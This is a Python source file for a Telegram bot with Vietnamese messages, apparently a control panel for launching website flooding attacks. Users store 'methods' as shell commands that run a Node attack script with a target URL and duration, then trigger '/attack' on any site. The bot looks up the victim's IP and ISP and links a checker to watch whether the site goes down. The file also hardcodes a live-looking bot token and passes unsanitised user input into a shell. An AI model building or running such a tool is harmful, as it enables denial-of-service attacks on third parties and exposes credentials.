import asyncio, json, socket, requests, time
from urllib import parse
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
from html import escape

TOKEN = '7584086130:AAHLJie2Y2GDJ6TLlQ4xnxvHYTMXpyuVdmc'
methods_data = {}

def load_methods():
    global methods_data
    try:
        with open('methods.json', 'r') as f:
            methods_data = json.load(f)
    except FileNotFoundError:
        methods_data = {}

def save_methods(): 
    with open('methods.json', 'w') as f: json.dump(methods_data, f, indent=4)

def get_ip_and_isp(url):
    try:
        ip = socket.gethostbyname(parse.urlsplit(url).netloc)
        response = requests.get(f"http://ip-api.com/json/{ip}")
        return ip, response.json() if response.ok else None
    except (socket.error, requests.exceptions.RequestException): return None, None

async def add(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if len(context.args) < 2: 
        return await update.message.reply_text("❌ Cú pháp sai. Cú pháp đúng: /add <method_name> <url> [timeset <time>]")
    
    method_name, url = context.args[0], context.args[1]
    time = 60
    if 'timeset' in context.args:
        try:
            time = int(context.args[context.args.index('timeset') + 1])
            context.args = context.args[:context.args.index('timeset')] + context.args[context.args.index('timeset') + 2:]
        except (ValueError, IndexError): 
            return await update.message.reply_text("❌ Tham số thời gian không hợp lệ.")
    
    # Đảm bảo thay thế các dấu gạch nối không chuẩn thành chuẩn
    command = f"node --max-old-space-size=102400 script.js {method_name} {url} {time} " + " ".join(context.args[2:])
    command = command.replace('—', '--')  # Thay thế dấu gạch nối không chuẩn

    methods_data[method_name] = {'command': command, 'url': url, 'time': time}
    save_methods()
    
    await update.message.reply_text(f"✅ Phương thức `{method_name}` đã được thêm thành công.\n🌐 URL: `{url}`\n⏱ Thời gian: `{time} giây`\n🛠 Tham số: `{', '.join(context.args[2:])}`", parse_mode="Markdown")


async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if len(context.args) != 2: return await update.message.reply_text("❌ Cú pháp sai. Cú pháp đúng: /attack <method_name> <url>")
    method_name, url = context.args[0], context.args[1]
    if method_name not in methods_data or not url.startswith(("http://", "https://")): return await update.message.reply_text("❌ Phương thức không tồn tại hoặc URL không hợp lệ.")
    ip, isp_info = get_ip_and_isp(url)
    if not ip: return await update.message.reply_text("❌ Không thể lấy IP từ URL.")
    attack_duration = methods_data[method_name]['time']
    command = methods_data[method_name]['command'].replace(methods_data[method_name]['url'], url)
    isp_info_text = json.dumps(isp_info, indent=2, ensure_ascii=False) if isp_info else 'Không có thông tin ISP.'
    username = update.message.from_user.username or update.message.from_user.full_name
    check_status_button = InlineKeyboardButton("🔍 Kiểm tra trạng thái website", url=f"https://check-host.net/check-http?host={url}")
    keyboard = InlineKeyboardMarkup([[check_status_button]])
    await update.message.reply_text(f"🚨 Tấn công {method_name} bắt đầu bởi @{username}.\n🌐 URL: `{url}`\n⏱ Thời gian tấn công: `{attack_duration} giây`\nThông tin ISP của host {escape(url)}:\n<pre>{escape(isp_info_text)}</pre>", reply_markup=keyboard, parse_mode='HTML')
    asyncio.create_task(execute_attack(command, update, method_name, time.time(), username, attack_duration))

async def execute_attack(command, update, method_name, start_time, username, attack_time):
    try:
        process = await asyncio.create_subprocess_shell(command, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
        stdout, stderr = await process.communicate()
        end_time = time.time()
        elapsed_time = round(end_time - start_time, 2)
        attack_status = "success" if not stderr else "error"
        result = {"method_name": method_name, "username": username, "start_time": time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(start_time)), "end_time": time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(end_time)), "elapsed_time": elapsed_time, "attack_time": attack_time, "attack_status": attack_status, "error": stderr.decode().strip() if stderr else None}
        await update.message.reply_text(json.dumps(result, indent=2, ensure_ascii=False))
    except Exception as e: await update.message.reply_text(f"❌ Lỗi trong quá trình tấn công: {str(e)}")

async def methods(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not methods_data: return await update.message.reply_text("❌ Chưa có phương thức nào.")
    methods_list = "📜 Các phương thức hiện có:\n" + "\n".join([f"{name}: {data['time']} giây" for name, data in methods_data.items()])
    await update.message.reply_text(methods_list)

async def del_method(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if len(context.args) < 1: return await update.message.reply_text("❌ Vui lòng nhập tên phương thức cần xóa.")
    method_name = context.args[0]
    if method_name in methods_data:
        del methods_data[method_name]
        save_methods()
        await update.message.reply_text(f"✅ Phương thức {method_name} đã được xóa.")
    else: await update.message.reply_text(f"❌ Phương thức {method_name} không tồn tại.")

async def help(update: Update, context: ContextTypes.DEFAULT_TYPE):
    help_text = "📜 **Hướng dẫn sử dụng:**\n1. **/add <method_name> <url> timeset <time> <additional_args>**: Thêm một phương thức mới.\n2. **/attack <method_name> <url>**: Tấn công bằng phương thức đã thêm trước đó.\n3. **/methods**: Xem các phương thức hiện có.\n4. **/del <method_name>**: Xóa phương thức tấn công."
    await update.message.reply_text(help_text)

app = ApplicationBuilder().token(TOKEN).build()
app.add_handler(CommandHandler("add", add))
app.add_handler(CommandHandler("attack", attack))
app.add_handler(CommandHandler("methods", methods))
app.add_handler(CommandHandler("del", del_method))
app.add_handler(CommandHandler("help", help))

if __name__ == "__main__": 
    load_methods()
    app.run_polling()
